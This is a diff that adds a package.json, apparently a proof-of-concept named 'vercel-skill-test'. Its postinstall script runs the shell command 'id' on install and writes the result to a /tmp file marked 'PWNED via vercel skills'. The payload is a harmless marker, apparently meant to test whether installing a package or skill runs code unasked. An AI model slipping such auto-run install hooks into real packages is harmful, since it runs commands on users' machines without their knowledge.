@@ -1,0 +1,7 @@
+{
+  "name": "vercel-skill-test",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('fs').writeFileSync('/tmp/vercel_f05_pwned.txt', 'PWNED via vercel skills\\nid: ' + require('child_process').execSync('id').toString())\""
+  }
+}
